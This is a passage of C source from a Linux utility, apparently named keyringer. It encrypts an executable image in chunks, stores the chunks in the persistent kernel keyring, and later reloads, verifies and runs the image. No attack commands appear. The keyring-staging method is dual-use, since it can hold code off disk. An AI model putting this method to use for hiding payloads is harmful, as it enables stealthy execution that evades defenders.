static void v4_chunk_salt(const uint8_t stash_id[KR_STASH_ID_LEN], uint32_t i,
                          uint8_t salt[KR_STASH_ID_LEN + 4])
{
    memcpy(salt, stash_id, KR_STASH_ID_LEN);
    kr_le32enc(salt + KR_STASH_ID_LEN, i);
}

/* AAD for chunk i: header(56) || u32le(i) || u32le(total) || u32le(ptlen_i) */
static void v4_chunk_aad(const uint8_t hdr[KR_HDR4_LEN], uint32_t i,
                         uint32_t total, uint32_t ptlen_i,
                         uint8_t aad[KR_V4_AAD_LEN])
{
    memcpy(aad, hdr, KR_HDR4_LEN);
    kr_le32enc(aad + KR_HDR4_LEN, i);
    kr_le32enc(aad + KR_HDR4_LEN + 4, total);
    kr_le32enc(aad + KR_HDR4_LEN + 8, ptlen_i);
}

/*
 * Parse + validate a KRH4 header against the exact wire-length equation.
 * Encrypted: wirelen == 56 + 28*total + ptlen with ptlen in
 * ((total-1)*PT, total*PT] — solved deterministically for total (the
 * loop is O(wirelen/PT)); the header's own u64 length field must agree.
 * Plain: wirelen == 56 + ptlen.  Returns 0 / -1+err.
 */
static int v4_parse_header(const uint8_t *wire, size_t wirelen, int enc,
                           uint64_t *ptlen_out, uint32_t *total_out,
                           char *err)
{
    uint64_t wantlen = 0;

    if (wirelen < KR_HDR4_LEN)
        return seterr(err, "load: truncated KRH4 header (%zu bytes)", wirelen);
    if (wire[4] != (uint8_t)KR_WIRE4_VERSION) {
        uint8_t gotver = wire[4];

        return seterr(err, "load: KRH4 header version %u unsupported (want "
                      "%u) — refusing", (unsigned)gotver,
                      (unsigned)KR_WIRE4_VERSION);
    }
    if (wire[5] & ~(uint8_t)KR_HDR4_FLAG_ENC)
        return seterr(err, "load: KRH4 header: reserved flag bits set "
                      "(0x%02x) — refusing", (unsigned)wire[5]);
    if (wire[6] || wire[7])
        return seterr(err, "load: KRH4 header: reserved bytes not zero — "
                      "refusing");
    for (int i = 0; i < 8; i++)
        wantlen |= (uint64_t)wire[48 + i] << (i * 8);

    if (enc) {
        if (!(wire[5] & KR_HDR4_FLAG_ENC))
            return seterr(err, "load: KRH4 body is not per-chunk sealed "
                          "(flags=0) — internal error");
        /*
         * wirelen = 56 + 28*T + ptlen, (T-1)*PT < ptlen <= T*PT.
         * Solve by scanning T upward: the lower bound is monotone in T
         * and exceeds any wirelen quickly, so the loop terminates in
         * O(wirelen/PT) iterations with no unbounded allocation.
         */
        for (uint32_t t = 1; ; t++) {
            uint64_t lo = KR_HDR4_LEN + (uint64_t)t * KR_V4_PIECE_OH +
                           ((uint64_t)t - 1) * KR_V4_PT_CHUNK + 1;
            uint64_t hi = KR_HDR4_LEN + (uint64_t)t * KR_V4_PIECE_OH +
                           (uint64_t)t * KR_V4_PT_CHUNK;

            if (wirelen < lo)
                break;
            if (wirelen <= hi) {
                uint64_t pl = (uint64_t)wirelen - KR_HDR4_LEN -
                              (uint64_t)t * KR_V4_PIECE_OH;

                if (pl != wantlen)
                    return seterr(err, "load: KRH4 length field says %llu "
                                  "but the chunk equation carries %llu "
                                  "bytes — truncated or spliced stash, "
                                  "refusing",
                                  (unsigned long long)wantlen,
                                  (unsigned long long)pl);
                *ptlen_out = pl;
                *total_out = t;
                return 0;
            }
        }
        return seterr(err, "load: KRH4 encrypted wire length %zu fits no "
                      "pt-chunk equation — truncated or spliced stash, "
                      "refusing", wirelen);
    }
    /* plain body: header || raw plaintext */
    {
        uint64_t pl = (uint64_t)wirelen - KR_HDR4_LEN;

        if (pl != wantlen)
            return seterr(err, "load: KRH4 length field says %llu but the "
                          "body carries %llu bytes — truncated or spliced "
                          "stash, refusing", (unsigned long long)wantlen,
                          (unsigned long long)pl);
        if (pl == 0)
            return seterr(err, "load: KRH4 stash carries an empty body");
        *ptlen_out = pl;
        *total_out = (uint32_t)((pl + KR_V4_PT_CHUNK - 1) / KR_V4_PT_CHUNK);
        return 0;
    }
}

/*
 * Decrypt body chunk i of a header-validated encrypted v4 wire into
 * scratch (layout aad||pt, so scratch must hold KR_V4_AAD_LEN + ptlen_i
 * bytes). The pt-chunks before i are all full-size, so piece i starts at
 * wire offset 56 + i*(28 + KR_V4_PT_CHUNK). Returns 0 / -1+err.
 */
static int v4_open_chunk(const uint8_t key[32], const uint8_t *wire,
                         uint32_t i, uint32_t total, uint64_t ptlen,
                         uint8_t *scratch, uint32_t *ptlen_i, char *err)
{
    uint8_t salt[KR_STASH_ID_LEN + 4], subkey[32];
    uint8_t aad[KR_V4_AAD_LEN];
    const uint8_t *piece = wire + KR_HDR4_LEN +
                           (uint64_t)i * (KR_V4_PIECE_OH + KR_V4_PT_CHUNK);
    uint32_t pl = (uint32_t)(ptlen - (uint64_t)i * KR_V4_PT_CHUNK <
                             KR_V4_PT_CHUNK
                             ? ptlen - (uint64_t)i * KR_V4_PT_CHUNK
                             : KR_V4_PT_CHUNK);

    v4_chunk_salt(wire + 40, i, salt);
    hkdf_sha256_ref(key, 32, salt, sizeof salt,
                    (const uint8_t *)KR4_INFO, strlen(KR4_INFO), subkey, 32);
    v4_chunk_aad(wire, i, total, pl, aad);
    if (kr_aead(1, subkey, aad, sizeof aad, piece + KR_NONCE_LEN,
                (size_t)pl + KR_TAG_LEN, piece, scratch, err) != 0) {
        volatile_wipe(subkey, sizeof subkey);
        return -1;                /* err names the AEAD failure */
    }
    volatile_wipe(subkey, sizeof subkey);
    *ptlen_i = pl;
    return 0;
}

/*
 * Build a v4 wire: KRH4 header || body, where the body is either the
 * plaintext (key32 == NULL) or total = ceil(n / KR_V4_PT_CHUNK) sealed
 * pieces. Every piece is roundtrip-verified (bounded scratch, chunk by
 * chunk) BEFORE the caller stores anything.  *out is malloc'd.
 */
static int build_v4_wire(const uint8_t *key32, const uint8_t *pt, size_t n,
                         uint8_t **out, size_t *outlen, char *err)
{
    uint32_t total = (uint32_t)((n + KR_V4_PT_CHUNK - 1) / KR_V4_PT_CHUNK);
    size_t wirelen = KR_HDR4_LEN + n +
                     (key32 ? (size_t)total * KR_V4_PIECE_OH : 0);
    uint8_t *wire = malloc(wirelen);
    char idhex[17];

    if (!wire)
        return seterr(err, "out of memory");
    if (n == 0)
        return seterr(err, "stash: empty input");

    memcpy(wire, KR_WIRE4_MAGIC, 4);
    wire[4] = (uint8_t)KR_WIRE4_VERSION;
    wire[5] = key32 ? (uint8_t)KR_HDR4_FLAG_ENC : 0;
    wire[6] = 0;
    wire[7] = 0;
    kr_sha256(pt, n, wire + 8, err);
    if (kr_random(wire + 40, KR_STASH_ID_LEN) != 0) {
        volatile_wipe(wire, wirelen);
        free(wire);
        return seterr(err, "stash: cannot obtain randomness for the stash id");
    }
    for (int i = 0; i < 8; i++)
        wire[48 + i] = (uint8_t)((uint64_t)n >> (i * 8));

    if (!key32) {
        memcpy(wire + KR_HDR4_LEN, pt, n);
        stash_id_hex(wire + 40, idhex);
        kr_logf("stash: KRH4 header (plaintext body, stash-id %s, wire v4, "
                "the default writer)", idhex);
        *out = wire;
        *outlen = wirelen;
        return 0;
    }

    {
        /* ONE bounded scratch for seal + verify: aad||ct||tag per chunk */
        uint8_t *scratch = malloc(KR_V4_AAD_LEN + KR_V4_PT_CHUNK +
                                  KR_TAG_LEN);
        size_t off = KR_HDR4_LEN;
        int failed = 0;

        if (!scratch) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "out of memory");
        }
        for (uint32_t i = 0; i < total && !failed; i++) {
            uint32_t pl = (uint32_t)(n - (size_t)i * KR_V4_PT_CHUNK <
                                     (size_t)KR_V4_PT_CHUNK
                                     ? n - (size_t)i * KR_V4_PT_CHUNK
                                     : KR_V4_PT_CHUNK);
            uint8_t salt[KR_STASH_ID_LEN + 4], subkey[32];
            uint8_t aad[KR_V4_AAD_LEN];
            uint8_t *piece = wire + off;

            v4_chunk_salt(wire + 40, i, salt);
            hkdf_sha256_ref(key32, 32, salt, sizeof salt,
                            (const uint8_t *)KR4_INFO, strlen(KR4_INFO),
                            subkey, 32);
            if (kr_random(piece, KR_NONCE_LEN) != 0) {
                seterr(err, "stash: cannot obtain randomness for the nonce");
                failed = 1;
                break;
            }
            v4_chunk_aad(wire, i, total, pl, aad);
            /* kr_aead writes aad||ct||tag — seal into scratch, then copy
             * the ct||tag tail in behind the nonce */
            if (kr_aead(0, subkey, aad, sizeof aad, pt + (size_t)i *
                        KR_V4_PT_CHUNK, pl, piece, scratch, err) != 0) {
                failed = 1;
                break;
            }
            memcpy(piece + KR_NONCE_LEN, scratch + KR_V4_AAD_LEN,
                   (size_t)pl + KR_TAG_LEN);
            volatile_wipe(subkey, sizeof subkey);
            off += KR_NONCE_LEN + (size_t)pl + KR_TAG_LEN;
        }

        /*
         * Roundtrip-verify every piece (bounded scratch) BEFORE anything
         * is handed back for storage — same contract as v2/v3.
         */
        for (uint32_t i = 0; i < total && !failed; i++) {
            uint32_t pl = 0;

            if (v4_open_chunk(key32, wire, i, total, n, scratch, &pl,
                              err) != 0 ||
                pl != (uint32_t)(n - (size_t)i * KR_V4_PT_CHUNK <
                                 (size_t)KR_V4_PT_CHUNK
                                 ? n - (size_t)i * KR_V4_PT_CHUNK
                                 : KR_V4_PT_CHUNK) ||
                memcmp(scratch + KR_V4_AAD_LEN,
                       pt + (size_t)i * KR_V4_PT_CHUNK, pl) != 0) {
                if (err && !*err)
                    seterr(err, "stash: v4 encrypt/decrypt roundtrip "
                          "mismatch");
                failed = 1;
                break;
            }
            volatile_wipe(scratch, KR_V4_AAD_LEN + pl);
        }
        volatile_wipe(scratch, KR_V4_AAD_LEN + KR_V4_PT_CHUNK + KR_TAG_LEN);
        free(scratch);
        if (failed) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
    }
    stash_id_hex(wire + 40, idhex);
    kr_logf("stash: sealed %u KR4 chunk(s), %zu -> %zu bytes (per-chunk "
            "ChaCha20-Poly1305, HKDF subkeys, stash-id %s, AAD-bound "
            "header; wire v4, the default writer)", total, n, wirelen -
            KR_HDR4_LEN, idhex);
    *out = wire;
    *outlen = wirelen;
    return 0;
}

/*
 * Open a v4 wire (buffer path, non-exec consumers): consume the wire,
 * return the malloc'd plaintext. The per-chunk decrypt uses ONE bounded
 * scratch (KR_V4_AAD_LEN + KR_V4_PT_CHUNK) and writes each piece
 * straight into its offset of the output buffer; the whole-stash digest
 * is accumulated with the streaming SHA-256 context, so even this path
 * never holds more than one pt-chunk of scratch plaintext.  The exec
 * path does not come through here at all (kr_load_revoke hands the
 * ciphertext wire to kr_exec_image's streaming assembly).
 */
static int wire_open_v4(const kr_opts *o, uint8_t *wire, size_t wirelen,
                        uint8_t **out, size_t *outlen, char *err)
{
    int enc = (wire[5] & KR_HDR4_FLAG_ENC) != 0;
    uint64_t ptlen;
    uint32_t total;
    uint8_t *pt = NULL, *scratch = NULL;
    uint8_t calc[32];
    int have_key = o && o->key_hex;
    int fail = 0;

    if (v4_parse_header(wire, wirelen, enc, &ptlen, &total, err) != 0) {
        fail = 1;
        goto done;
    }
    if (enc && !have_key) {
        seterr(err, "load: stash body is per-chunk KR4-sealed; pass the "
              "same key (--key HEX or $KEYRINGER_KEY)");
        fail = 1;
        goto done;
    }
    if (!enc && have_key) {
        seterr(err, "load: stash body is not encrypted but --key was "
              "given — load again without --key");
        fail = 1;
        goto done;
    }

    pt = malloc(ptlen ? (size_t)ptlen : 1);
    scratch = malloc(KR_V4_AAD_LEN + KR_V4_PT_CHUNK);
    if (!pt || !scratch) {
        seterr(err, "out of memory");
        fail = 1;
        goto done;
    }

    if (enc) {
        uint8_t key[32];
        kr_sha256_ctx hc;

        if (hex32(o->key_hex, key, err) != 0) {
            fail = 1;
            goto done;
        }
        kr_sha256_init(&hc);
        for (uint32_t i = 0; i < total; i++) {
            uint32_t pl = 0;

            if (v4_open_chunk(key, wire, i, total, ptlen, scratch, &pl,
                              err) != 0) {
                volatile_wipe(key, sizeof key);
                fail = 1;
                goto done;
            }
            memcpy(pt + (size_t)i * KR_V4_PT_CHUNK, scratch + KR_V4_AAD_LEN,
                   pl);
            kr_sha256_update(&hc, scratch + KR_V4_AAD_LEN, pl);
            volatile_wipe(scratch, KR_V4_AAD_LEN + pl);
        }
        volatile_wipe(key, sizeof key);
        kr_sha256_final(&hc, calc);
    } else {
        memcpy(pt, wire + KR_HDR4_LEN, (size_t)ptlen);
        kr_sha256(pt, (size_t)ptlen, calc, err);
    }

    if (memcmp(calc, wire + 8, 32) != 0) {
        char want[KR_KEY_HEX_LEN + 1], got[KR_KEY_HEX_LEN + 1];

        hex32_encode(wire + 8, want);
        hex32_encode(calc, got);
        seterr(err, "load: integrity digest MISMATCH — stash is corrupt "
              "or was modified after stash (expected sha256 %s, computed "
              "%s); refusing to execute", want, got);
        fail = 1;
        goto done;
    }

done:
    if (scratch) {
        volatile_wipe(scratch, KR_V4_AAD_LEN + KR_V4_PT_CHUNK);
        free(scratch);
    }
    if (fail) {
        if (pt) {
            volatile_wipe(pt, (size_t)ptlen ? (size_t)ptlen : 1);
            free(pt);
        }
        volatile_wipe(wire, wirelen);
        free(wire);
        return -1;
    }
    volatile_wipe(wire, wirelen);
    free(wire);
    kr_logf("load: integrity digest ok (sha256, %llu-byte plaintext, wire "
            "v4%s)", (unsigned long long)ptlen,
            enc ? ", per-chunk AEAD" : "");
    *out = pt;
    *outlen = (size_t)ptlen;
    return 0;
}

/* open a v3 wire: consume it, return the malloc'd plaintext */
static int wire_open_v3(const kr_opts *o, uint8_t *wire, size_t wirelen,
                        uint8_t **out, size_t *outlen, char *err)
{
    uint8_t *pt = NULL;
    size_t ptlen;
    uint32_t flags = (uint32_t)wire[5];
    uint64_t wantlen = 0;

    if (wire[4] != (uint8_t)KR_WIRE3_VERSION) {
        uint8_t gotver = wire[4];

        volatile_wipe(wire, wirelen);
        free(wire);
        return seterr(err, "load: KRH3 header version %u unsupported (want "
                      "%u) — stash from a different tool generation, "
                      "refusing", (unsigned)gotver,
                      (unsigned)KR_WIRE3_VERSION);
    }
    if (flags & ~(uint32_t)KR_HDR3_FLAG_ENC) {
        volatile_wipe(wire, wirelen);
        free(wire);
        return seterr(err, "load: KRH3 header: reserved flag bits set "
                      "(0x%02x) — refusing", (unsigned)flags);
    }
    for (int i = 0; i < 8; i++)
        wantlen |= (uint64_t)wire[48 + i] << (i * 8);

    if (flags & KR_HDR3_FLAG_ENC) {
        uint8_t key[32], subkey[32], aad[KR_HDR3_LEN + 15];
        uint8_t *scratch;
        size_t ctlen;

        if (!o || !o->key_hex) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: stash body is a KR2 encrypted "
                          "envelope; pass the same key (--key HEX or "
                          "$KEYRINGER_KEY)");
        }
        if (wirelen < KR_HDR3_LEN + KR_ENV_OVERHEAD) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: KRH3 encrypted wire truncated");
        }
        if (hex32(o->key_hex, key, err) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        hkdf_sha256_ref(key, 32, wire + 40, KR_STASH_ID_LEN,
                        (const uint8_t *)KR3_INFO, strlen(KR3_INFO),
                        subkey, 32);
        if (memcmp(wire + KR_HDR3_LEN, KR_ENV2_MAGIC, 3) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: KRH3 encrypted body is not a KR2 "
                          "envelope");
        }
        memcpy(aad, wire, KR_HDR3_LEN);
        memcpy(aad + KR_HDR3_LEN, wire + KR_HDR3_LEN, 15);
        ctlen = wirelen - KR_HDR3_LEN - 15;
        scratch = malloc(KR_HDR3_LEN + 15 + ctlen);
        pt = malloc(ctlen ? ctlen : 1);
        if (!scratch || !pt) {
            free(scratch);
            free(pt);
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "out of memory");
        }
        if (kr_aead(1, subkey, aad, sizeof aad,
                    wire + KR_HDR3_LEN + 15, ctlen, wire + KR_HDR3_LEN + 3,
                    scratch, err) != 0) {
            volatile_wipe(scratch, KR_HDR3_LEN + 15 + ctlen);
            free(scratch);
            volatile_wipe(pt, ctlen);
            free(pt);
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        ptlen = ctlen - KR_TAG_LEN;      /* ct||tag in; pt out */
        memcpy(pt, scratch + KR_HDR3_LEN + 15, ptlen);
        volatile_wipe(scratch, KR_HDR3_LEN + 15 + ctlen);
        free(scratch);
    } else {
        if (o && o->key_hex) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: stash body is not encrypted but --key "
                          "was given — load again without --key");
        }
        ptlen = wirelen - KR_HDR3_LEN;
        pt = malloc(ptlen ? ptlen : 1);
        if (!pt) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "out of memory");
        }
        memcpy(pt, wire + KR_HDR3_LEN, ptlen);
    }

    /* authenticated length (in the AAD for encrypted bodies) + digest */
    if (wantlen != (uint64_t)ptlen) {
        volatile_wipe(pt, ptlen);
        free(pt);
        volatile_wipe(wire, wirelen);
        free(wire);
        return seterr(err, "load: KRH3 length field says %llu but body "
                      "carries %zu bytes — truncated or spliced stash, "
                      "refusing", (unsigned long long)wantlen, ptlen);
    }
    {
        uint8_t calc[32];

        kr_sha256(pt, ptlen, calc, err);
        if (memcmp(calc, wire + 8, 32) != 0) {
            char want[KR_KEY_HEX_LEN + 1], got[KR_KEY_HEX_LEN + 1];

            hex32_encode(wire + 8, want);
            hex32_encode(calc, got);
            volatile_wipe(pt, ptlen);
            free(pt);
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: integrity digest MISMATCH — stash is "
                          "corrupt or was modified after stash (expected "
                          "sha256 %s, computed %s); refusing to execute",
                          want, got);
        }
    }
    volatile_wipe(wire, wirelen);
    free(wire);
    kr_logf("load: integrity digest ok (sha256, %zu-byte plaintext, wire v3)",
            ptlen);
    *out = pt;
    *outlen = ptlen;
    return 0;
}

/*
 * Wire open: consume a reassembled wire payload and produce the
 * plaintext image. Handles both the v2 KRH1 header (flags validation +
 * optional KR1 decryption + SHA-256 integrity verification, mismatch is
 * fatal) and the legacy headerless formats (plaintext, or KR1 envelope
 * when a key is given — logged as "pre-v2 stash" through the log hook).
 *
 * `wire` is ALWAYS consumed on every path: on success it has either
 * been wiped+freed after the plaintext was extracted, or (legacy
 * plaintext pass-through) transferred to *out; on failure it is
 * wiped+freed. *out is a malloc'd buffer the caller frees.
 */
static int wire_open(const kr_opts *o, uint8_t *wire, size_t wirelen,
                     uint8_t **out, size_t *outlen, char *err)
{
    uint8_t *pt;
    size_t ptlen;

    if (wirelen >= KR_HDR4_LEN && memcmp(wire, KR_WIRE4_MAGIC, 4) == 0)
        return wire_open_v4(o, wire, wirelen, out, outlen, err);

    if (wirelen >= KR_HDR3_LEN && memcmp(wire, KR_WIRE3_MAGIC, 4) == 0)
        return wire_open_v3(o, wire, wirelen, out, outlen, err);

    if (wirelen >= KR_HDR_LEN && memcmp(wire, KR_WIRE_MAGIC, 4) == 0) {
        uint32_t flags = (uint32_t)wire[4] | ((uint32_t)wire[5] << 8) |
                         ((uint32_t)wire[6] << 16) | ((uint32_t)wire[7] << 24);
        const uint8_t *digest = wire + 8;

        if (flags & ~(uint32_t)KR_HDR_FLAG_ENC) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: KRH1 header: reserved flag bits set "
                          "(0x%08" PRIx32 ") — stash from a newer wire "
                          "protocol, refusing", flags);
        }

        if (flags & KR_HDR_FLAG_ENC) {
            uint8_t key[32];

            if (!o || !o->key_hex) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return seterr(err, "load: stash body is a KR1 encrypted "
                              "envelope; pass the same key (--key HEX or "
                              "$KEYRINGER_KEY)");
            }
            if (hex32(o->key_hex, key, err) != 0) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return -1;
            }
            if (envelope_open(key, wire + KR_HDR_LEN, wirelen - KR_HDR_LEN,
                              &pt, &ptlen, err) != 0) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return -1;
            }
        } else {
            if (o && o->key_hex) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return seterr(err, "load: stash body is not encrypted but "
                              "--key was given — load again without --key");
            }
            pt = malloc(wirelen - KR_HDR_LEN ? wirelen - KR_HDR_LEN : 1);
            if (!pt) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return seterr(err, "out of memory");
            }
            memcpy(pt, wire + KR_HDR_LEN, wirelen - KR_HDR_LEN);
            ptlen = wirelen - KR_HDR_LEN;
        }

        /* integrity digest: SHA-256 of the plaintext, mismatch is fatal */
        uint8_t calc[32];

        if (sha256_afalg(pt, ptlen, calc, err) != 0) {
            volatile_wipe(pt, ptlen);
            free(pt);
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        if (memcmp(calc, digest, 32) != 0) {
            char want[KR_KEY_HEX_LEN + 1], got[KR_KEY_HEX_LEN + 1];

            hex32_encode(digest, want);
            hex32_encode(calc, got);
            volatile_wipe(pt, ptlen);
            free(pt);
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: integrity digest MISMATCH — stash is "
                          "corrupt or was modified after stash (expected "
                          "sha256 %s, computed %s); refusing to execute",
                          want, got);
        }
        volatile_wipe(wire, wirelen);
        free(wire);
        kr_logf("load: integrity digest ok (sha256, %zu-byte plaintext)",
                ptlen);
        *out = pt;
        *outlen = ptlen;
        return 0;
    }

    /* legacy: no KRH1 header — pre-v2 stash, no integrity digest */
    if (o && o->key_hex) {
        uint8_t key[32];

        if (hex32(o->key_hex, key, err) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        if (wirelen >= 3 && memcmp(wire, KR_MAGIC, 3) == 0) {
            if (envelope_open(key, wire, wirelen, &pt, &ptlen, err) != 0) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return -1;
            }
            volatile_wipe(wire, wirelen);
            free(wire);
        } else {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: --key given but the stash is neither a "
                          "KRH1 v2 stash nor a KR1 envelope (was it stashed "
                          "without --key?)");
        }
    } else {
        if (wirelen >= 3 && memcmp(wire, KR_MAGIC, 3) == 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "load: stash is a KR1 encrypted envelope; pass "
                          "the same key (--key HEX or $KEYRINGER_KEY)");
        }
        pt = wire;                    /* plaintext pass-through */
        ptlen = wirelen;
    }
    kr_logf("load: no integrity digest (pre-v2 stash)");
    *out = pt;
    *outlen = ptlen;
    return 0;
}

/* ===================================================================== */
/* Phase 1: stash wire payload as "user"/"big_key" key chunks             */
/* ===================================================================== */

static void chunk_desc(char *buf, size_t bufsz, const char *prefix, size_t idx)
{
    snprintf(buf, bufsz, "%s.%03zu", prefix, idx);
}

typedef struct {
    long  *v;
    size_t n, cap;
} serials_t;

static int serials_add(serials_t *sv, long s)
{
    if (sv->n == sv->cap) {
        size_t ncap = sv->cap ? sv->cap * 2 : 16;
        long *nv = realloc(sv->v, ncap * sizeof *nv);

        if (!nv)
            return -1;
        sv->v = nv;
        sv->cap = ncap;
    }
    sv->v[sv->n++] = s;
    return 0;
}

static size_t serials_revoke_all(serials_t *sv)
{
    size_t r = sv->n;

    for (size_t i = 0; i < sv->n; i++)
        syscall(__NR_keyctl, KEYCTL_REVOKE, sv->v[i], 0, 0);
    sv->n = 0;
    return r;
}

/* stash key type + its wire chunk size ("user" 30000 / "big_key" 100000) */
static const char *stash_key_type(const kr_opts *o)
{
    return (o && o->key_type && o->key_type[0]) ? o->key_type : KR_TYPE_USER;
}

static size_t stash_chunk_size(const char *type)
{
    /*
     * big_key carries up to 1 MiB per key on this kernel; we chunk at
     * 100000 wire bytes. Note: big_key payloads may spill to
     * swap-backed shmem on this and other kernels — that is the
     * capacity tradeoff chosen with --type big_key — and on this kernel
     * a big_key charges its description + 21 bytes of quota, NOT its
     * payload (measured; see keyringer.h). kr_stash auto-selects the
     * type for the maxkeys relief only.
     */
    return strcmp(type, KR_TYPE_BIGKEY) == 0 ? KR_CHUNK_BIGKEY : KR_CHUNK_MAX;
}

/* Phase 3 helper (below) */
static int validate_elf(const uint8_t *d, size_t n, const char *what,
                        const Elf64_Ehdr **eh_out, const Elf64_Phdr **ph_out,
                        char *err);

/*
 * Overflow-safe range check: does [off, off+len) stay inside limit?
 * Every ELF bounds check uses this form — the naive `off + len > limit`
 * wraps on attacker-chosen u64 values and passes the check while the
 * pointer arithmetic walks out of the buffer (found by test/fuzz_elf).
 */
static int kr_oob(uint64_t off, uint64_t len, uint64_t limit)
{
    return off > limit || len > limit - off;
}

/* find the payload ELF's interpreter path (PT_INTERP), if any */
static int find_pt_interp(const uint8_t *d, size_t n, char *path,
                          size_t pathsz, char *err)
{
    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph;

    if (validate_elf(d, n, "stash", &eh, &ph, err) != 0)
        return -1;
    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &ph[i];

        if (p->p_type != PT_INTERP)
            continue;
        if (kr_oob(p->p_offset, p->p_filesz, n)) {
            seterr(err, "stash: PT_INTERP out of bounds");
            return -1;
        }
        if (!memchr(d + p->p_offset, '\0', p->p_filesz)) {
            seterr(err, "stash: PT_INTERP path not NUL-terminated");
            return -1;
        }
        snprintf(path, pathsz, "%s", (const char *)d + p->p_offset);
        return 1;
    }
    return 0;                      /* static ELF: no interpreter */
}

/* store one wire as chunk keys of `type` under `prefix` on `ring` */
static int store_chunks(const uint8_t *wire, size_t wirelen,
                        const char *type, const char *prefix, long ring,
                        serials_t *sv, char *err)
{
    size_t chunkmax = stash_chunk_size(type);
    size_t nchunks = (wirelen + chunkmax - 1) / chunkmax;

    if (nchunks > KR_IDX_MAX + 1)
        return seterr(err, "stash: %zu chunks needed, max %zu (chunk size %lu)",
                      nchunks, KR_IDX_MAX + 1, (unsigned long)chunkmax);
    for (size_t i = 0; i < nchunks; i++) {
        size_t off = i * chunkmax;
        size_t clen = wirelen - off < chunkmax ? wirelen - off : chunkmax;
        char desc[DESC_MAX];

        chunk_desc(desc, sizeof desc, prefix, i);
        long serial = syscall(__NR_add_key, type, desc, wire + off, clen, ring);

        if (serial == -1) {
            int e = errno;
            size_t r = serials_revoke_all(sv);

            if (e == EDQUOT || e == ENOMEM)
                return seterr(err, "stash: add_key(\"%s\", %zu bytes) failed: "
                              "%s — kernel keyring quota exceeded; non-root cap: "
                              "/proc/sys/kernel/keys/maxbytes (20000 bytes here), "
                              "root cap: 25 MiB; %zu chunk(s) revoked",
                              desc, clen, strerror(e), r);
            return seterr(err, "stash: add_key(\"%s\", %zu bytes) failed: %s "
                          "(%zu chunk(s) revoked)", desc, clen, strerror(e), r);
        }
        if (serials_add(sv, serial) != 0) {
            serials_revoke_all(sv);
            return seterr(err, "stash: out of memory");
        }
        kr_logf("stash: %s [%s] -> key %ld (%zu bytes)", desc, type, serial,
                clen);
    }
    return (int)nchunks;
}

/*
 * Resolve the per-UID persistent keyring serial. Dest serial 0 would
 * return the ring unlinked, but this kernel rejects dest 0 with EINVAL;
 * retrying with the user keyring (@u) as dest works and still returns
 * the persistent.<uid> serial (it also links the ring under @u, which is
 * what `keyctl show @u` displays). Persistent rings expire after
 * /proc/sys/kernel/keys/persistent_keyring_expiry (259200s here)
 * without access; every GET_PERSISTENT refreshes the clock.
 */
static long persistent_ring(char *err)
{
    long ring = syscall(__NR_keyctl, KEYCTL_GET_PERSISTENT,
                        (unsigned long)getuid(), 0UL);

    if (ring != -1)
        return ring;
    if (errno != EINVAL)
        goto fail;
    ring = syscall(__NR_keyctl, KEYCTL_GET_PERSISTENT,
                   (unsigned long)getuid(),
                   (unsigned long)KEY_SPEC_USER_KEYRING);
    if (ring != -1)
        return ring;
fail:
    seterr(err, "stash: KEYCTL_GET_PERSISTENT failed: %s", strerror(errno));
    return -1;
}

/* ===================================================================== */
/* keyring quota telemetry (live /proc measurement) + upfront planning    */
/* ===================================================================== */

/* read one unsigned long from /proc/sys/kernel/keys/<leaf>; -1 on error */
static long kr_keys_sysctl(const char *leaf)
{
    char path[64], buf[64];
    FILE *f;

    snprintf(path, sizeof path, "/proc/sys/kernel/keys/%s", leaf);
    f = fopen(path, "r");
    if (!f)
        return -1;
    if (!fgets(buf, sizeof buf, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    return strtol(buf, NULL, 10);
}

int kr_quota_snapshot(kr_quota *q, char err[KR_ERRSZ])
{
    int root = geteuid() == 0;
    long kmax = kr_keys_sysctl(root ? "root_maxkeys" : "maxkeys");
    long bmax = kr_keys_sysctl(root ? "root_maxbytes" : "maxbytes");

    if (!q)
        return seterr(err, "quota: no snapshot struct");
    memset(q, 0, sizeof *q);
    if (kmax < 0 || bmax < 0)
        return seterr(err, "quota: cannot read /proc/sys/kernel/keys/"
                      "%s%s%s%s — quota limits unknown (planning skipped)",
                      root ? "root_maxkeys" : "maxkeys",
                      kmax < 0 ? "" : " (ok)",
                      root ? "/root_maxbytes" : "/maxbytes",
                      bmax < 0 ? "" : " (ok)");
    q->keys_max = (unsigned long)kmax;
    q->bytes_max = (unsigned long)bmax;

    /*
     * /proc/key-users rows, format VERIFIED EMPIRICALLY on this kernel
     * (7.0.14-17-pve, 2026-10; controlled add_key + field-by-field
     * observation, including a live maxkeys sysctl change):
     *   "  <uid>: <usage> <nkeys>/<qnkeys> <nikeys>/<maxkeys> <qnbytes>/<maxbytes>"
     *   usage    refcount of the per-UID key_user record
     *   nkeys    keys owned by the uid                (quota keys USED)
     *   qnkeys   keys-quota charge — equals nkeys on this kernel (it is
     *            NOT a limit; the pre-6.x "keys/maxkeys" reading is wrong
     *            here and made the planner refuse everything)
